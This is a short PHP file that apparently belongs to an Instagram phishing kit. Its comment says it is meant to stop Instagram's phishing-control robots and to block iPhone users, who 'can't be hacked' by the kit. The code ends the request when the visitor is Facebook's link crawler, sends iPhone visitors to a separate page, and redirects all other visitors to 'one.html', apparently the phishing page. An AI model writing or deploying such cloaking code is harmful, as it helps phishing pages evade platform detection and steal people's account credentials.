<?php

// For stop instagram phishing control robots and block all iphone users (Because of iphone (safari) isn't supported form post method so you can't hack any safari browser user!).

if (strpos($_SERVER['HTTP_USER_AGENT'], 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)') !== false){die();}
if (strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone') !== false){die(header("Location: ./browser.html"));}

// This will redirect real users

header('Location: ./one.html');
?>
